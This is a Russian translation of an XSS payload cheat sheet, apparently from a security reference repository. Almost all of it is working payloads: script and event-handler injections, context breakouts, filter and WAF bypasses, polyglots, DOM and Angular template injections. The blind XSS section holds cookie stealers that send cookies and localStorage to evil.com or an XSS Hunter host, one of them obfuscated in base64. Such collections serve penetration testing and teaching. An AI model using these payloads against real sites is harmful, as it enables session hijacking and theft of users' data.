<a id="-xss-payloads-collection"></a>
# 💉 Коллекция полезных нагрузок XSS

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../XSS.md)

> **Уточнение к оригиналу.** Примеры зависят от контекста HTML/JS/URL, браузера, CSP и библиотек; универсальный обход не гарантируется. Старые CSS expression и отдельные теги могут не работать в современных браузерах. [MDN об innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) уточняет: вставленные script-теги обычно не выполняются, хотя обработчики событий могут оставаться опасными. JSON-строка сама по себе не выполняет JavaScript, а примеры URL источников требуют уязвимого пути обработки данных до точки выполнения (sink). Исходные payloads сохранены дословно.

[🇹🇷 Türkçe Sürüm](XSS.tr.md) • [🇬🇷 Ελληνικά](XSS.el.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Базовые полезные нагрузки](#-basic-payloads)
- [Полезные нагрузки в обработчиках событий](#-event-handler-payloads)
- [Внедрение в атрибуты](#-attribute-injection)
- [Контекст JavaScript](#-javascript-context)
- [Обход фильтров](#-filter-bypass)
- [Обход WAF](#-waf-bypass)
- [Полиглотные полезные нагрузки](#-polyglot-payloads)
- [Слепая XSS](#-blind-xss)
- [DOM XSS](#-dom-xss)

---

<a id="-basic-payloads"></a>
## 🔴 Базовые полезные нагрузки

<a id="classic-script-tags"></a>
### Классические теги script

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

<a id="self-closing-tags"></a>
### Самозакрывающиеся теги

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

<a id="external-script"></a>
### Внешний скрипт

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

<a id="-event-handler-payloads"></a>
## ⚡ Полезные нагрузки в обработчиках событий

<a id="image-events"></a>
### События изображений

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

<a id="svg-events"></a>
### События SVG

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

<a id="body-events"></a>
### События body

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

<a id="input-events"></a>
### События input

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

<a id="other-event-handlers"></a>
### Другие обработчики событий

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

<a id="-attribute-injection"></a>
## 🔗 Внедрение в атрибуты

<a id="breaking-out-of-attributes"></a>
### Выход из атрибутов

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

<a id="event-in-attributes"></a>
### События в атрибутах

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

<a id="style-attribute-old-browsers"></a>
### Атрибут style (старые браузеры)

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

<a id="-javascript-context"></a>
## 📜 Контекст JavaScript

<a id="breaking-out-of-javascript"></a>
### Выход из JavaScript

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

<a id="template-literals"></a>
### Шаблонные литералы

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

<a id="inside-json"></a>
### Внутри JSON

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

<a id="-filter-bypass"></a>
## 🔓 Обход фильтров

<a id="case-variation"></a>
### Изменение регистра

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

<a id="tag-breaking"></a>
### Разбиение тегов

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

<a id="encoding---html-entities"></a>
### Кодирование HTML-сущностями

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

<a id="url-encoding"></a>
### URL-кодирование

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

<a id="unicode-encoding"></a>
### Unicode-кодирование

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

<a id="null-byte-injection"></a>
### Внедрение нулевого байта

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

<a id="whitespace-bypass"></a>
### Обход фильтра пробельных символов

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

<a id="without-parentheses"></a>
### Без круглых скобок

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

<a id="without-quotes"></a>
### Без кавычек

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

<a id="-waf-bypass"></a>
## 🛡️ Обход WAF

<a id="double-encoding"></a>
### Двойное кодирование

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

<a id="using-comments"></a>
### Использование комментариев

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

<a id="line-breaks"></a>
### Переносы строк

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

<a id="alternative-tags"></a>
### Альтернативные теги

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

<a id="svg-based-bypass"></a>
### Обход через SVG

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

<a id="using-eval"></a>
### Использование `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

<a id="using-settimeoutsetinterval"></a>
### Использование `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

<a id="using-fetch"></a>
### Использование `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

<a id="-polyglot-payloads"></a>
## 🎭 Полиглотные полезные нагрузки

<a id="universal-xss-polyglots"></a>
### Универсальные полиглоты XSS

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

<a id="short-polyglot"></a>
### Короткий полиглот

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

<a id="-blind-xss"></a>
## 👁️ Слепая XSS

<a id="cookie-stealer"></a>
### Перехват cookies

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

<a id="data-exfiltration"></a>
### Вывод данных

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

<a id="xss-hunter-payloads"></a>
### Полезные нагрузки XSS Hunter

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

<a id="blind-xss-for-forms"></a>
### Слепая XSS для форм

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

<a id="-dom-xss"></a>
## 🌐 DOM XSS

<a id="source-based-dom-xss"></a>
### DOM XSS: источники данных

```javascript
// Фрагмент URL
https://example.com#<script>alert(1)</script>

// Параметр URL
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

<a id="common-sinks"></a>
### Распространённые точки выполнения (sinks)

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

<a id="jquery-sinks"></a>
### Точки выполнения jQuery

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

<a id="angular-payloads"></a>
### Полезные нагрузки Angular

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

<a id="-quick-reference-by-context"></a>
## 📊 Краткий справочник по контекстам

<a id="html-context"></a>
### Контекст HTML
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

<a id="attribute-context"></a>
### Контекст атрибута
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

<a id="javascript-string-context"></a>
### Контекст строки JavaScript
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

<a id="url-context"></a>
### Контекст URL
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Справочник XSS PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Обход фильтров XSS OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 Набор полезных нагрузок XSS</b><br>
  <i>Только в образовательных целях!</i>
</p>
